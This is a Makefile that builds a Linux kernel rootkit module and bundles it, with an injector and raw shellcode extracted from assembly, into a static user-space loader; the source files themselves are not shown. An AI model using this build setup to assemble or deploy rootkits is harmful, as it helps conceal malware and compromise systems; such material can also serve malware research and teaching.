TARGET = rootkit
KERNEL_SRC = src/kernel
rootkit-objs = $(KERNEL_SRC)/main.o $(KERNEL_SRC)/hook.o $(KERNEL_SRC)/devices.o $(KERNEL_SRC)/utils.o
obj-m := $(TARGET).o

PWD := $(shell pwd)
KDIR := /lib/modules/$(shell uname -r)/build

all: module user

user: module
	ld -s -r -b binary rootkit.ko -o rootkit.ko.o
	gcc src/user/injector.c -c -o injector.o
	gcc -c src/user/shellcode.s -o shellcode.o
	objcopy -O binary --only-section=.text shellcode.o shellcode.bin
	ld -s -r -b binary shellcode.bin -o shellcode.o
	gcc src/user/user.c rootkit.ko.o injector.o shellcode.o  -o user -static

module:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	mv src/user/shellcode.s shellcode.bk
	$(MAKE) -C $(KDIR) M=$(PWD) clean
	mv shellcode.bk src/user/shellcode.s
	rm -f *.bin
